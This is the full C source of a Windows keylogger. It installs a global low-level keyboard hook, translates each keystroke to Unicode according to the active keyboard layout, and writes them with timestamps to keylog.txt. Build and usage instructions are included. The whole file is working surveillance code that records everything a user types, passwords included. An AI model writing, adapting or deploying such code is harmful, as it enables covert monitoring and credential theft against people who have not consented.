/*
 * Windows Keylogger with Unicode support
 *
 * Installs a global low-level keyboard hook and logs translated
 * keystrokes to a file with timestamps. Uses ToUnicodeEx for
 * layout-aware character translation (handles AZERTY, QWERTY,
 * accented characters, dead keys).
 *
 * Build:  x86_64-w64-mingw32-gcc keylogger.c -o keylogger.exe
 * Usage:  keylogger.exe
 *         (writes to keylog.txt in working directory)
 */

#include <windows.h>
#include <stdio.h>
#include <time.h>

static HHOOK  g_hook    = NULL;
static FILE  *g_logfile = NULL;

/*
 * Writes a timestamp line to the log file.
 */
static void write_timestamp(void) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    fprintf(g_logfile, "\n[%04d-%02d-%02d %02d:%02d:%02d] ",
            t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
            t->tm_hour, t->tm_min, t->tm_sec);
}

/*
 * Translates a virtual key code to its actual Unicode character
 * representation, considering the current keyboard layout and
 * modifier state (Shift, CapsLock, AltGr).
 *
 * Special keys are tagged in brackets (e.g. [ENTER], [TAB]).
 */
static void translate_key(DWORD vkCode, DWORD scanCode, char *out, size_t out_size) {
    /* Explicitly tagged special keys */
    switch (vkCode) {
        case VK_RETURN:   snprintf(out, out_size, "[ENTER]\n"); return;
        case VK_TAB:      snprintf(out, out_size, "[TAB]"); return;
        case VK_BACK:     snprintf(out, out_size, "[BACKSPACE]"); return;
        case VK_ESCAPE:   snprintf(out, out_size, "[ESC]"); return;
        case VK_LSHIFT: case VK_RSHIFT: case VK_SHIFT:
        case VK_LCONTROL: case VK_RCONTROL: case VK_CONTROL:
        case VK_LMENU: case VK_RMENU: case VK_MENU:
        case VK_CAPITAL:
            /* Modifier keys: ignore on their own, they'll be
               reflected in the case of subsequent keys */
            out[0] = '\0';
            return;
        case VK_LWIN: case VK_RWIN:
            snprintf(out, out_size, "[WIN]"); return;
        case VK_DELETE:   snprintf(out, out_size, "[DEL]"); return;
        case VK_LEFT:     snprintf(out, out_size, "[LEFT]"); return;
        case VK_RIGHT:    snprintf(out, out_size, "[RIGHT]"); return;
        case VK_UP:       snprintf(out, out_size, "[UP]"); return;
        case VK_DOWN:     snprintf(out, out_size, "[DOWN]"); return;
    }

    /* Function keys F1-F12 */
    if (vkCode >= VK_F1 && vkCode <= VK_F12) {
        snprintf(out, out_size, "[F%lu]", vkCode - VK_F1 + 1);
        return;
    }

    /* Capture full keyboard state for translation context */
    BYTE keyboard_state[256];
    if (!GetKeyboardState(keyboard_state)) {
        out[0] = '\0';
        return;
    }

    /* Use the keyboard layout of the foreground window's thread */
    HWND foreground = GetForegroundWindow();
    DWORD threadId = GetWindowThreadProcessId(foreground, NULL);
    HKL layout = GetKeyboardLayout(threadId);

    WCHAR unicode_buf[8] = {0};

    /* Flag 0x04 = observe without modifying keyboard state.
       Critical to not interfere with dead-key handling in
       other applications. */
    int result = ToUnicodeEx(vkCode, scanCode, keyboard_state,
                              unicode_buf, 8, 0x04, layout);

    if (result > 0) {
        /* Convert UTF-16 (Windows native) to UTF-8 (log file) */
        int utf8_len = WideCharToMultiByte(CP_UTF8, 0, unicode_buf, result,
                                             out, out_size - 1, NULL, NULL);
        if (utf8_len > 0) {
            out[utf8_len] = '\0';
        } else {
            out[0] = '\0';
        }
    } else {
        /* result == 0: no character produced (pure modifier)
           result < 0:  dead key awaiting next keystroke */
        out[0] = '\0';
    }
}

/*
 * Hook callback. Called by Windows for every keyboard event
 * before it reaches its destination application.
 * Must always chain to CallNextHookEx.
 */
static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;

        char buffer[32];
        translate_key(kb->vkCode, kb->scanCode, buffer, sizeof(buffer));

        if (buffer[0] != '\0') {
            fprintf(g_logfile, "%s", buffer);
            fflush(g_logfile);
        }
    }

    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

int main(void) {
    /* Set console to UTF-8 for accent display */
    SetConsoleOutputCP(CP_UTF8);

    printf("[*] Keylogger starting\n");

    g_logfile = fopen("keylog.txt", "a");
    if (g_logfile == NULL) {
        printf("[!] Cannot open keylog.txt for writing\n");
        return 1;
    }

    write_timestamp();
    fprintf(g_logfile, "=== Session started ===");
    fflush(g_logfile);

    printf("[*] Log file: keylog.txt\n");
    printf("[*] Installing hook...\n");

    g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc,
                                GetModuleHandle(NULL), 0);

    if (g_hook == NULL) {
        printf("[!] Hook installation failed (error: %lu)\n", GetLastError());
        fclose(g_logfile);
        return 1;
    }

    printf("[+] Hook active. Press Ctrl+C to stop.\n");

    /* Message loop — required to keep the hook alive */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hook);
    fclose(g_logfile);
    return 0;
}
